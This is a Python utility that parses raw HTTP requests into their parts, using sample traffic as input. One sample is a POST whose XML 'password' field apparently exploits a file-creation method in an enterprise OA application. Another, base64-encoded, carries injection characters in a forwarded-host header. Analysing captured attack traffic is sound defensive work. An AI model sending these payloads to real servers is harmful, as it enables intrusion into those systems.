from urllib.parse import urlparse, parse_qs

import base64
import picohttpparser 

raw_request = (
    b"GET /path?name=Alice&age=30'aaa=112222 HTTP/1.1\r\n"
    b"Host: example.com\r\n"
    b"Content-Type: text/plain\r\n\r\n"
    # b"body content ffffffffffffffff"
)


def parser_req_raw_example(request_raw):
    parsed = picohttpparser.parse_http_request(request_raw)
    req_body = parsed["body"] 
    
    uri_parsed = urlparse(parsed["path"])    
    return dict(
        cgi=uri_parsed.path, 
        cgi_full=parsed["path"], 
        args=parse_qs(uri_parsed.query), 
        method=parsed["method"], 
        http_version=parsed["version"], 
        headers=parsed["headers"],
        body_base64=base64.b64encode(req_body).decode() if req_body else "", 
        body_decode_cnt=req_body.decode() if req_body else "", 
    )
    


if __name__ == "__main__":
    raw1 = """POST /api/hrm/secondarypwd/checkPassword HTTP/1.1
Host: 192.168.174.194
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ecology_JSessionid=aaaxhM3zmQNLdfYsrKIyz; __randcode__=2fdf8165-801c-4904-a809-6b92e8d2b8ea; languageidweaver=7; loginuuids=29; JSESSIONID=aaaxhM3zmQNLdfYsrKIyz; loginidweaver=29
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 364

password=<root pagesize="10" pageIndex="1" tabletype="checkbox"><checkboxpopedom showmethod="com.api.integration.util.FileUtil.createFile" popedompara='C:/yfsapwqexqwe'><checkboxList></checkboxList></checkboxpopedom><head></head><sql sqlprimarykey="IMAGEFILEID" backfields="IMAGEFILEID" sqlform="IMAGEFILE" sqlsortway="sqlsortway"><sqlhint>1</sqlhint></sql></root>
"""
    raw2 = base64.b64decode("R0VUIC9jZWh1YS9reC1wYXJrL3doLnBocCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBXT1c2NCkgQXBwbGVXZWJLaXQvNTM3LjIxIChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzQxLjAuMjIyOC4wIFNhZmFyaS81MzcuMjENCkhvc3Q6IHd3dy5reGhvdHNwcmluZy5jb20NCngtZm9yd2FyZGVkLWZvcjogMTc1LjE3NC41OS4xODINCngtdGVuY2VudC11YTogUWNsb3VkDQpjb25uZWN0aW9uOiBLZWVwLWFsaXZlDQpDTE9VRC1XQUYtVVVJRDogNDYyNDE5NDA4NzQ3MTk1MDE2Ng0KcmVmZXJlcjogaHR0cDovL3d3dy5nb29nbGUuY29tL3NlYXJjaD9obD1lbiZxPXRlc3RpbmcNCkNMT1VELVdBRi1ERUZBVUxULURPTUFJTjogd3d3Lmt4aG90c3ByaW5nLmNvbQ0Kc3Rndy1kc3RpcDogMTI3LjAuMC4xDQozNTM3OGQ3NTE1MWQ3OGExYmM3OTdlMWE3ODdmN2JkOTogdGFnDQpzdGd3LXNyY2lwOiAxMjIuMjQ2LjMxLjQ5DQpDTE9VRC1XQUYtRURJVElPTjogc3BhcnRhLXdhZg0KYWNjZXB0OiAqLyoNCngtZm9yd2FyZGVkLXByb3RvOiBodHRwDQp4LWZvcndhcmRlZC1ob3N0OiAxMjM0NSciXCdcIik7fF0qew0KPD7vv70nJ/CfkqkNCmFjY2VwdC1lbmNvZGluZzogZ3ppcCxkZWZsYXRlDQpjODVlY2M1YWQ3ZWY2ZGMxOTgwZWJmYjlhOWYzZjc1MDogdGFnDQppbnN0YW5jZWlkOiB3YWZfMmt3NnM3dGcwYTk4a2g3eg0KY2xpZW50LWlwOiAxMjcuMC4wLjENCkNMT1VELVdBRi1TRVJWRVItQUREUjogMzAuMTcyLjE4OS43Ng0KdmlhOiAxLjEgd2Eud3d3LnRlc3QuY29tDQpvcmlnaW46IGh0dHA6Ly93d3cudGVzdC5jb20vDQpDTE9VRC1XQUYtUkVBTC1IT1NUOiB3d3cua3hob3RzcHJpbmcuY29tDQp4LW53cy1sb2ctdXVpZDogNDYyNDE5NDA4NzQ3MTk1MDE2Ng0KeC1sZWdvLXZpYTogMjAwNDg4DQphY2NlcHQtbGFuZ3VhZ2U6IGVuDQoNCg==")
    print(raw2)
    
    print(base64.b64encode(raw1.encode()).decode())
    result = parser_req_raw_example(request_raw=raw2) 
    import json 
    print(json.dumps(result, indent=2))
